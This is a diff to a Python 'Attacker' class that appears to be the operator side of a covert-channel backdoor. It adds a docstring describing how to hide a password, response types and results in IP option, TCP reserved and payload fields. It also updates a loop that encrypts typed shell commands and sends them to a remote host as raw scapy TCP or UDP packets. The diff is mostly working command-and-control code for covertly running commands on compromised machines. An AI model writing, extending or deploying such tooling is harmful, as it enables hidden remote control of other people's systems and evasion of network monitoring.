@@ -10,6 +10,13 @@ import iptablesManager
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 BUFSIZE = 1024
 
+"""
+Design for covert channel
+password stored in ip_option field
+type of response stored in tcp reserved field
+result stored in tcp payload
+"""
+
 class Attacker(object):
 
     def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList, ttl):
@@ -56,11 +63,11 @@ class Attacker(object):
         while True:
             cmd = input(" ")
             sys.stdout.flush()
-            payload = encryption.encrypt(attackerConfig.password + cmd)
+            payload = encryption.encrypt(self.password + cmd)
             if self.protocol == 'TCP':
-                packet = IP(dst=remoteIP, src=localIP)/TCP(dport=remotePort, sport=localPort)/Raw(load=payload)
+                packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
             elif self.protocol == 'UDP':
-                packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)/Raw(load=payload)
+                packet = IP(dst=self.remoteIP, src=self.localIP)/UDP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
 
             send(packet, verbose=False)
 
